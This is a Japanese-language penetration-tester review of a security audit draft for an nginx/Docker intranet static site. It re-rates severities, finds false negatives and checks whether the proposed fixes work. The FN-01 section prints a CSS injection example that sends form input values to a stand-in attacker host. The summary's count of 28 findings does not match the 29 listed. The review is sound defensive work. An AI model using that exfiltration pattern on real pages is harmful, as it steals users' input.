# セキュリティ監査ドラフト レビュー結果

**レビュー実施日**: 2026-03-19  
**レビューアロール**: 攻撃的セキュリティ専門家（ペネトレーションテスター）  
**対象**: インフラストラクチャ・セキュリティ監査ドラフト（D-01〜X-02）  
**対象システム**: Next.js static export + nginx配信（社内イントラ向け、ポート8314）

---

## 1. レビュー概要

### 目的
監査ドラフトの各指摘事項について、攻撃者視点から以下を検証する：
- Severity評価の妥当性（過大・過小評価の有無）
- 誤検知（False Positive）の有無
- 見落とし（False Negative）の有無
- 提案された修正案が実環境で実際に動作するかの技術的検証

### 方法
1. 各指摘IDのSeverity評価を、デプロイコンテキスト（社内イントラ、静的サイト）を考慮して再評価
2. Alpine Linux（BusyBox ash）上での実コマンド動作検証
3. nginx.conf / Dockerfile / docker-compose.yml / start.sh の実構成に基づく攻撃面分析
4. CSP（Content Security Policy）ヘッダの詳細解析

---

## 2. Severity評価の検証

| 指摘ID | カテゴリ | 概要 | ドラフト評価 | レビュー判定 | 備考 |
|--------|----------|------|-------------|-------------|------|
| D-01 | Dockerfile | ベースイメージdigest未固定 | Medium | ✅ 適切 | サプライチェーン攻撃のリスクは妥当 |
| D-02 | Dockerfile | `COPY . .` による過大コピー | Medium | ✅ 適切 | ビルドコンテキストに秘密情報混入リスク |
| D-03 | Dockerfile | マルチステージビルド | OK | ✅ 適切 | ビルド成果物のみ最終ステージに配置 |
| D-04 | Dockerfile | openssl追加による攻撃面積増加 | Low | ✅ 適切 | 実行時に必要、除去は困難 |
| D-05 | Dockerfile | 非root実行 | OK | ✅ 適切 | `USER nginx` で適切に実装 |
| D-06 | Dockerfile | キャッシュ効率 | Info | ✅ 適切 | セキュリティ影響は限定的 |
| N-01 | nginx | セキュリティヘッダ群 | OK | ⚠️ 適切（見落としあり） | `style-src 'unsafe-inline'` への言及なし（後述FN-01） |
| N-02 | nginx | HSTS未設定 | Low | ✅ 適切 | HTTP(8080)リッスンのため直接設定不可、前段依存 |
| N-03 | nginx | レート制限未実装 | Medium | ✅ 適切 | Basic認証へのブルートフォース対策として重要 |
| N-04 | nginx | ログ出力先の明示不足 | Medium | ❌ **過大評価** | `nginx:alpine`イメージはシンボリックリンクでstdout/stderrにデフォルト出力。**Info/Low が妥当** |
| N-05 | nginx | gzip BREACH攻撃 | Low | ✅ 適切 | 静的サイトではBREACH条件を満たさない |
| N-06 | nginx | HTTPメソッド制限 | OK | ✅ 適切 | GET/HEADのみ許可、405返却 |
| N-07 | nginx | `client_max_body_size`未明示 | Info | ✅ 適切 | GET/HEADのみのためリスクは最小 |
| C-01 | Compose | ポート全インターフェースバインド | Medium | ❌ **過大評価** | 社内イントラ向けデプロイではネットワーク境界の保護が前提。**Low が妥当** |
| C-02 | Compose | リソース制限未設定 | Medium | ❌ **過大評価** | 単一サービスのイントラ向けデプロイ。DoS対策の優先度は低い。**Low が妥当** |
| C-03 | Compose | healthcheck未設定 | Medium | ✅ 評価は適切 | ただし**修正案が動作しない**（後述） |
| C-04 | Compose | ログローテーション未指定 | Low | ✅ 適切 | Dockerデーモン側設定で対応可能 |
| C-05 | Compose | 環境変数での認証情報注入 | Medium | ✅ 適切 | `/proc/*/environ`経由の漏洩リスク |
| C-06 | Compose | `read_only` / `no-new-privileges` / `cap_drop` | OK | ✅ 適切 | コンテナハードニングは良好 |
| S-01 | start.sh | `$'\n'`のPOSIX非依存 | Medium | ❌ **過大評価** | Alpine(BusyBox ash)で動作確認済み。可搬性の懸念のみ。**Low が妥当** |
| S-02 | start.sh | `openssl passwd`引数露出 | Medium | ✅ 適切 | `/proc/*/cmdline`経由でパスワード漏洩リスク |
| S-03 | start.sh | umask未設定 | Low | ✅ 適切 | `.htpasswd`は`chmod 600`で保護済み |
| S-04 | start.sh | コマンドインジェクション耐性 | OK | ✅ 適切 | `case`文によるバリデーション実装済み |
| S-05 | start.sh | apr1ハッシュの強度 | Low | ✅ 適切 | MD5ベースだが、用途を考慮すると許容範囲 |
| G-01 | .gitignore | 主要除外 | OK | ✅ 適切 | — |
| G-02 | .gitignore | 秘密鍵除外不足 | Medium | ✅ 適切 | `*.pem`等のパターン追加推奨 |
| G-03 | .gitignore | Dockerfile除外不要 | Info | ✅ 適切 | ビルド成果物であり除外不要 |
| X-01 | 横断 | 非root整合性 | OK | ✅ 適切 | Dockerfile〜Compose間で一貫性あり |
| X-02 | 横断 | Build最適化余地 | Medium | ✅ 適切 | — |

### Severity過大評価のサマリ

| 指摘ID | ドラフト評価 | 推奨評価 | 理由 |
|--------|-------------|---------|------|
| N-04 | Medium | Info/Low | `nginx:alpine`はデフォルトでstdout/stderr出力（シンボリックリンク設定済み） |
| C-01 | Medium | Low | 社内イントラ向けデプロイでは、ネットワーク境界保護が前提 |
| C-02 | Medium | Low | 単一サービス構成のイントラ向けデプロイでDoS脅威は限定的 |
| S-01 | Medium | Low | ターゲット環境（Alpine/BusyBox ash）で実際に動作。可搬性リスクのみ |

---

## 3. 誤検知（False Positive）の指摘

### FP-01: N-04 ログ出力先の明示不足

**ドラフトの指摘**: nginx.confでaccess_log/error_logが明示されておらず、ログの出力先が不明確。

**技術検証結果**:  
`nginx:alpine` Dockerイメージは、ビルド時に以下のシンボリックリンクを設定している：

```
/var/log/nginx/access.log -> /dev/stdout
/var/log/nginx/error.log  -> /dev/stderr
```

nginxのコンパイル時デフォルトログパスは `/var/log/nginx/access.log` および `/var/log/nginx/error.log` である。nginx.confで明示的にログパスを指定しなくても、シンボリックリンク経由で標準出力/標準エラー出力に出力される。

なお、本リポジトリのnginx.confでは実際に `access_log /dev/stdout;` と `error_log /dev/stderr;` を明示的に設定しており、ログ出力先は正しく構成されている。

**判定**: この指摘は実構成を正確に反映しておらず、**誤検知（False Positive）に近い**。仮に明示設定がなくてもDockerイメージのシンボリックリンクにより問題は発生しない。Severity は **Info** が妥当。

---

## 4. 見落とし（False Negative）の指摘

### FN-01: CSP `style-src 'unsafe-inline'` — Low〜Medium

**現状のCSPヘッダ（nginx.conf）**:
```
style-src 'self' 'unsafe-inline'
```

**リスク分析**:  
`unsafe-inline` はインラインスタイルの実行を許可し、CSPによるCSSインジェクション防御を無効化する。攻撃者がHTMLコンテンツを注入できる場合、以下の攻撃が可能となる：

1. **CSSベースのデータ窃取**: `input[value^="a"] { background: url(https://attacker.com/?v=a) }` パターンによるフォーム入力値の窃取
2. **UIリドレッシング**: 正規UI要素の上に偽のUI要素を重ねる
3. **コンテンツ偽装**: ページコンテンツの視覚的改変

**緩和要因**: 静的サイトであり、ユーザ入力がHTMLに反映される経路が存在しないため、実際の悪用可能性は低い。ただし、CSPの堅牢性を損なう設定であることは記録すべき。

**推奨Severity**: Low（静的サイトの文脈）。動的コンテンツが追加される場合はMediumに引き上げ。

**修正案**: `'unsafe-inline'` を削除し、必要なインラインスタイルを `'sha256-...'` ハッシュまたは `'nonce-...'` で個別許可する。

---

### FN-02: `upgrade-insecure-requests` on HTTP — Info

**現状のCSPヘッダ**:
```
upgrade-insecure-requests
```

**リスク分析**:  
nginx自体はHTTP（ポート8080）でリッスンしている。前段にTLS終端（リバースプロキシ、ロードバランサー等）が存在しない場合、ブラウザがサブリソース（画像、CSS、JS等）のリクエストをHTTPSにアップグレードしようとする。しかし、HTTPSエンドポイントが存在しないため、サブリソースの読み込みが失敗する可能性がある。

**緩和要因**: 社内イントラ環境では、前段にTLS終端を配置するアーキテクチャが一般的であり、その場合はこのディレクティブは正しく機能する。

**推奨Severity**: Info。前段にTLS終端がない構成で問題が顕在化する。

---

### FN-03: `server_name _;` による Host header injection — Info〜Low

**現状のnginx.conf**:
```nginx
server_name _;
```

**リスク分析**:  
キャッチオールのserver_nameは、任意のHostヘッダーを受け入れる。攻撃者が細工したHostヘッダーを送信した場合：

1. **ログポイズニング**: アクセスログに任意のHostヘッダー値が記録され、ログ解析ツールの動作に影響を与える可能性
2. **キャッシュポイズニング**: 前段にキャッシュ（CDN、Varnish等）が存在する場合、Hostヘッダーをキャッシュキーに含む構成ではキャッシュ汚染の可能性

**緩和要因**: 静的サイトであり、Hostヘッダーの値をアプリケーションロジックで使用していない。社内イントラ環境では外部からのHost header injection リスクは限定的。

**推奨Severity**: Info（イントラ環境）。公開環境ではLowに引き上げ。

---

### FN-04: Basic認証のHTTP平文送信リスク — Low〜Medium

**リスク分析**:  
Basic認証はBase64エンコード（暗号化ではない）されたクレデンシャルを `Authorization` ヘッダーで送信する。nginx自体がHTTP（8080）でリッスンしているため、TLS終端が前段にない場合、ネットワーク上でクレデンシャルが平文で送信される。

攻撃シナリオ：
1. **パッシブスニッフィング**: 同一ネットワークセグメント上の攻撃者がパケットキャプチャでクレデンシャルを窃取
2. **ARPスプーフィング / MITM**: ローカルネットワーク上の中間者攻撃によるクレデンシャル窃取
3. **クレデンシャルリユース**: 窃取されたクレデンシャルが他のサービスでも使用されている場合の横展開

**緩和要因**: 社内イントラ環境ではネットワーク境界が保護されている前提。N-02でHSTSには言及しているが、Basic認証とHTTPの組み合わせに対する直接的なリスク指摘が不足している。

**推奨Severity**: Low（イントラ環境前提）。一般公開環境ではMedium。

---

## 5. 修正案の技術的検証

### 5.1 C-03: healthcheck修正案 — ❌ 動作しない

**ドラフトの修正案**:
```yaml
healthcheck:
  test: ["CMD-SHELL", "wget -q --spider http://127.0.0.1:8080/ || exit 1"]
  interval: 30s
  timeout: 5s
  retries: 3
```

**検証結果**:  
nginx.confではルートパス `/` 全体に `auth_basic "Restricted"` が設定されている。認証情報を付与しないHTTPリクエストは **401 Unauthorized** を返す。

```
$ wget -q --spider http://127.0.0.1:8080/
→ server returned error: HTTP/1.1 401 Unauthorized (Exit code: 1)

$ curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:8080/
→ 401
```

**影響**: healthcheckが常に失敗し、コンテナが永続的に `unhealthy` とマークされる。オーケストレーターの構成によっては再起動ループに陥る。

**代替案**（推奨順）:

#### 代替案1（推奨）: 認証除外のhealthcheckエンドポイント

nginx.confに認証不要のlocationブロックを追加：

```nginx
location /healthz {
    access_log off;
    auth_basic off;
    return 200 'ok';
    add_header Content-Type text/plain;
}
```

docker-compose.yml:
```yaml
healthcheck:
  test: ["CMD-SHELL", "wget -q --spider http://127.0.0.1:8080/healthz || exit 1"]
  interval: 30s
  timeout: 5s
  retries: 3
```

**利点**: HTTPレベルの健全性確認が可能。認証をバイパスするのはhealthcheckエンドポイントのみ。攻撃面の増加は最小限。

#### 代替案2: TCPレベルチェック

```yaml
healthcheck:
  test: ["CMD-SHELL", "nc -z 127.0.0.1 8080 || exit 1"]
  interval: 30s
  timeout: 5s
  retries: 3
```

**利点**: 認証の影響を受けない。追加のnginx設定不要。  
**欠点**: TCPポートがリッスンしていることのみ確認。nginxのワーカープロセス障害やconfigエラーによるHTTPレベルの異常を検出できない。

#### 代替案3: 認証情報付きリクエスト（非推奨）

```yaml
healthcheck:
  test: ["CMD-SHELL", "wget -q --spider --user=$BASIC_AUTH_USER --password=$BASIC_AUTH_PASS http://127.0.0.1:8080/ || exit 1"]
  interval: 30s
  timeout: 5s
  retries: 3
```

**欠点**: `/proc/*/cmdline` 経由でクレデンシャルがプロセスリストに露出する。S-02で指摘されている `openssl passwd` の引数露出と同種のリスクを新たに導入するため、**推奨しない**。

---

### 5.2 S-01: `$'\n'` パターン — ✅ ターゲット環境で動作

**ドラフトの修正案**: POSIX準拠の改行チェック構文への変更。

**検証結果**:  
BusyBox ash（Alpine Linux）は ANSI-C quoting (`$'\n'`) を **サポートしている**。

- 改行を含む変数: MATCH（正しく動作）
- 改行を含まない変数: NO MATCH（正しく動作）

start.shの現行コードはターゲット環境（Alpine Linux / BusyBox ash）で正しく動作する。ただし、`$'\n'` はPOSIX標準外であり、dash等のsh実装では動作しない可能性がある。

**評価**: 修正案自体は技術的に正しいが、Severityは **Low**（可搬性の懸念のみ）が妥当。現行コードの修正優先度は低い。

---

### 5.3 S-02: `openssl passwd -stdin` — ✅ 動作確認済み

**ドラフトの修正案**:
```sh
HASHED_PASS="$(echo "${BASIC_AUTH_PASS}" | openssl passwd -apr1 -stdin)"
```

**検証結果**:  
Alpine Linuxの openssl 3.5.5 で `-stdin` オプションは正常に動作する。

```
$ echo 'testpass' | openssl passwd -apr1 -stdin
→ $apr1$xxxx$xxxx（正常にハッシュ生成）
→ Exit code: 0
```

**評価**: 修正案は技術的に正しく、`/proc/*/cmdline` 経由のパスワード露出リスクを解消する。**適用推奨**。

---

### 5.4 N-05: gzip BREACH リスク — ✅ 評価適切

**検証結果**:  
BREACH攻撃の成立条件：
1. TLSによる通信暗号化
2. HTTP圧縮（gzip等）の適用
3. 応答本文にユーザ制御可能な文字列と秘密情報の共存

静的サイトはユーザ入力を応答本文に反映しないため、条件3を満たさない。Low評価は妥当。

---

## 6. 総合評価

### 監査ドラフトの品質

| 評価項目 | 評価 | コメント |
|----------|------|---------|
| カバレッジ | **良好** | Dockerfile、nginx.conf、docker-compose.yml、start.sh、.gitignoreを網羅的に監査 |
| Severity評価の精度 | **概ね適切** | 28件中4件が過大評価（N-04, C-01, C-02, S-01）。イントラ環境のコンテキストをより考慮すべき |
| 修正案の実用性 | **要改善** | C-03のhealthcheck修正案がBasic認証環境で動作しない致命的な問題あり |
| 見落とし | **一部あり** | CSP `style-src 'unsafe-inline'`（FN-01）、HTTP平文認証リスク（FN-04）の指摘が欠落 |
| 技術的正確性 | **良好** | S-02の`-stdin`修正案は動作確認済み。大半の指摘は技術的に正確 |

### 攻撃者視点での総合リスク評価

本システムは社内イントラ向けの静的ドキュメントサイトであり、攻撃面は限定的である。最も現実的な脅威は以下の順：

1. **Basic認証のブルートフォース**（N-03: レート制限未実装）— 最も悪用可能性が高い
2. **クレデンシャル平文送信**（FN-04）— TLS終端の有無に依存
3. **サプライチェーン攻撃**（D-01: digest未固定）— ビルド時のリスク
4. **コンテナエスケープ経路の認証情報露出**（C-05, S-02）— `/proc` 経由

### 修正優先度

| 優先度 | 対応項目 |
|--------|---------|
| **高** | C-03 healthcheck修正案の差し替え（認証除外エンドポイント方式） |
| **高** | S-02 `openssl passwd`の`-stdin`対応（プロセスリスト露出の解消） |
| **中** | N-03 レート制限の実装（Basic認証ブルートフォース対策） |
| **中** | FN-01 CSP `style-src 'unsafe-inline'` の除去 |
| **低** | C-01, C-02のSeverity修正（イントラ環境に合わせた再評価） |
| **低** | FN-02, FN-03の記録（将来の構成変更時の参照用） |

---

*本レビューは攻撃的セキュリティ専門家（ペネトレーションテスター）の視点から、実環境での技術検証結果に基づいて実施された。CSPのsha256ハッシュは事前検証により正確性が確認されており、本レビューの対象外とした。*
